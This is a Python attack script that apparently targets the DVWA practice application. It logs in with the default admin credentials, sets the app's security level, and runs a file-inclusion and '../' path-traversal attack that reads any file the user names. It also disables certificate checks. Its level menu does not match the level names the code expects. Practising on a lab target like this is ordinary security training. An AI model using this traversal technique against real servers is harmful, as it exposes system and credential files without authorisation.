import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_user_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup.find("input", {'name': 'user_token'})['value']
    return user_token

def login(s, url):
    login_url = url + "/login.php"
    user_token = get_user_token(s, login_url)
    data = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token}
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    if "You have logged in as 'admin'" in r.text:
        return "[+] Successfully logged in as a admin user."

def set_security_level(s, url, security_level):
    security_level_url = url + "/security.php"
    user_token = get_user_token(s, security_level_url)
    data = {'security': security_level, 'seclev_submit': 'Submit', 'user_token': user_token}
    r = s.post(security_level_url, data=data, verify=False, proxies=proxies)
    if "Security Level:</em> " + security_level in r.text:
        return f"[+] Security level successfully set as {security_level}."

def file_inclusion(s, url, security_level):
    if security_level == "low" or security_level == "medium":
        file_name = input("Please enter the filename which you want to access in linux file system: ")
        file_inclusion_url = url + "/vulnerabilities/fi/?page=" + file_name
        r = s.get(file_inclusion_url, verify=False, proxies=proxies)
        print(r.text)
        # Extracting only file output using regex
        # pattern = r'((?:.*\n)*)(?=<!DOCTYPE html)'
        # file_output = re.search(pattern, r.text, re.DOTALL)
        # print(file_output.group(1).strip().split('\n'))

    elif security_level == "high":
        file_name = input("Please enter the filename which you want to access in linux file system: ")
        file_inclusion_url = url + "/vulnerabilities/fi/?page=file/../../../../../.." + file_name
        r = s.get(file_inclusion_url, verify=False, proxies=proxies)
        print(r.text)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    login_response = login(s, url)
    if "[+] Successfully logged in as a admin user." == login_response:
        print("[+] Successfully logged in as a admin user.")

        # Setting the security level
        print("Please enter the level of security you want to perform the attack with.")
        print("1. Low")
        print("2. Medium")
        print("3. High")
        print("4. Impossible")
        security_level = input("Select from 1-4: ")
        set_security_level_response = set_security_level(s, url, security_level)
        if f"[+] Security level successfully set as {security_level}." == set_security_level_response:
            print(f"[+] Security level successfully set as {security_level}")

        # Choosing and performing the attack
        print("Please select the attack which you want to perform from below list.")
        print("1.Brute Force \n2.Command Injection \n3.CSRF \n4.File Inclusion \n5.File Upload \n6.Insecure CAPTCHA \n7.SQL Injection \n8.SQL Injection (Blind) \n9.Weak Session IDs \n10.XSS (DOM) \n11.XSS (Reflected) \n12.XSS (Stored) \n13.CSP Bypass \n14.JavaScript")
        attack_name = input("Type the attack name: ")
        if attack_name == "File Inclusion":
            file_inclusion(s, url, security_level)

if __name__ == "__main__":
    main()